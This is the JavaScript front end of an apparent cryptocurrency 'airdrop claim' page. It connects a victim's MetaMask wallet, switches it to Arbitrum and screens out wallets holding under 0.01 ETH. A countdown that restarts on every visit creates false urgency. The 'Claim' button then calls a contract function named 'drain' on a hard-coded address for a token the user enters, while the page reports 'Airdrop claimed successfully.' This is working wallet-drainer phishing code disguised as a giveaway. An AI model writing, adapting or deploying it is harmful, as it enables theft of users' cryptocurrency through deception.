const CONTRACT_ADDRESS = "0xaE8183621c5f7e219C063820cF7865d232C0bB32";
const ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "token", "type": "address" }],
    "name": "drain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

let provider;
let signer;
let contract;

const connectBtn = document.getElementById("connectBtn");
const claimBtn = document.getElementById("claimBtn");
const status = document.getElementById("status");
const countdownEl = document.getElementById("countdown");
const deadlineEl = document.getElementById("deadline");

const airdropDeadline = new Date(Date.now() + 3 * 24 * 60 * 60 * 1000);
deadlineEl.innerText = airdropDeadline.toLocaleString();

function updateCountdown() {
  const now = Date.now();
  const distance = airdropDeadline.getTime() - now;

  if (distance < 0) {
    countdownEl.innerText = "Airdrop has ended";
    claimBtn.disabled = true;
    claimBtn.classList.add("disabled");
    connectBtn.disabled = false;
    return;
  }

  const days = Math.floor(distance / (1000 * 60 * 60 * 24));
  const hours = Math.floor((distance / (1000 * 60 * 60)) % 24);
  const minutes = Math.floor((distance / (1000 * 60)) % 60);
  const seconds = Math.floor((distance / 1000) % 60);

  countdownEl.innerText = `${days}d ${hours}h ${minutes}m ${seconds}s`;
}
setInterval(updateCountdown, 1000);
updateCountdown();

async function checkEligibility(address) {
  const balance = await provider.getBalance(address);
  const ethBalance = Number(ethers.formatEther(balance));
  return ethBalance >= 0.01;
}

async function switchToArbitrum() {
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0xa4b1' }] // 42161 decimal = 0xa4b1 hex
    });
  } catch (switchError) {
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0xa4b1',
            chainName: 'Arbitrum One',
            rpcUrls: ['https://arb1.arbitrum.io/rpc'],
            nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
            blockExplorerUrls: ['https://arbiscan.io']
          }]
        });
      } catch (addError) {
        console.error("Failed to add Arbitrum network", addError);
      }
    } else {
      console.error("Failed to switch network", switchError);
    }
  }
}

connectBtn.addEventListener("click", async () => {
  if (!window.ethereum) {
    status.innerText = "🦊 Please install MetaMask!";
    return;
  }

  await switchToArbitrum();

  try {
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    status.innerText = `✅ Connected: ${accounts[0]}`;

    provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();

    const eligible = await checkEligibility(accounts[0]);
    if (!eligible) {
      status.innerText = "❌ Wallet balance too low (need ≥ 0.01 ETH)";
      claimBtn.disabled = true;
      claimBtn.classList.add("disabled");
      return;
    }

    contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
    connectBtn.disabled = true;
    claimBtn.disabled = false;
    claimBtn.classList.remove("disabled");
  } catch (err) {
    if (err.code === 4001) {
      status.innerText = "❌ User rejected the connection request.";
    } else {
      status.innerText = `❌ Connection failed: ${err.message || err}`;
    }
    console.error("Connection error:", err);
  }
});

claimBtn.addEventListener("click", async () => {
  const tokenAddress = prompt("Enter ERC20 token address to claim:");
  if (!tokenAddress) {
    status.innerText = "Token address is required";
    return;
  }

  try {
    status.innerText = "Waiting for transaction confirmation...";

    const tx = await contract.drain(tokenAddress);
    status.innerText = `Transaction sent: ${tx.hash}`;

    await tx.wait();
    status.innerText = "Transaction confirmed! Airdrop claimed successfully.";
  } catch (err) {
    status.innerText = `Transaction failed: ${err.message}`;
  }
});
